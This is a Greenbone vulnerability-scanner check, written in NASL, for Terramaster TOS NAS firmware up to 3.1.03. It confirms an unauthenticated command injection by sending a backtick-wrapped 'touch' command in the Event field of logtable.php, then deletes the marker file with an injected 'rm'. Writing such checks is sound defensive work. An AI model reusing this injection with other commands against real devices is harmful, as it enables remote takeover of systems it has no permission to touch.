# Copyright (C) 2018 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:noontec:terramaster";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141751");
  script_version("2021-06-24T11:00:30+0000");
  script_tag(name:"last_modification", value:"2021-06-24 11:00:30 +0000 (Thu, 24 Jun 2021)");
  script_tag(name:"creation_date", value:"2018-12-04 17:22:47 +0700 (Tue, 04 Dec 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)");

  script_cve_id("CVE-2018-13329", "CVE-2018-13330", "CVE-2018-13331", "CVE-2018-13332", "CVE-2018-13333",
                "CVE-2018-13334", "CVE-2018-13335", "CVE-2018-13336", "CVE-2018-13337", "CVE-2018-13338",
                "CVE-2018-13349", "CVE-2018-13350", "CVE-2018-13351", "CVE-2018-13352", "CVE-2018-13353",
                "CVE-2018-13354", "CVE-2018-13355", "CVE-2018-13356", "CVE-2018-13357", "CVE-2018-13358",
                "CVE-2018-13359", "CVE-2018-13360", "CVE-2018-13361", "CVE-2018-13418");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Terramaster TOS <= 3.1.03 Multiple Vulnerabilities");

  script_category(ACT_GATHER_INFO);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_terramaster_nas_detect.nasl");
  script_mandatory_keys("terramaster_nas/detected");

  script_tag(name:"summary", value:"Terramaster TOS is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"affected", value:"Terramaster TOS version 3.1.03 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://blog.securityevaluators.com/vulnerabilities-in-terramaster-tos-3-1-03-fb99cf88b86a?gi=2baa8c595109");
  script_xref(name:"URL", value:"https://blog.securityevaluators.com/terramaster-nas-vulnerabilities-discovered-and-exploited-b8e5243e7a63");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

vt_strings = get_vt_strings();
file = vt_strings["default_rand"] + ".txt";

url = '/include/ajax/logtable.php';
headers = make_array("Content-Type", "application/x-www-form-urlencoded");
data =  "tab=gettotal&Event=%60touch%20%2Fusr%2Fwww%2F" + file + "%60&table=access_syslog";

req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req);

req = http_get(port: port, item: "/" + file);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200") {
  report = "It was possible to execute the os command 'touch' to write a file on the system.";
  security_message(port: port, data: report);

  # Cleanup
  data =  "tab=gettotal&Event=%60rm%20%2Fusr%2Fwww%2F" + file + "%60&table=access_syslog";
  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req);

  exit(0);
}

exit(99);
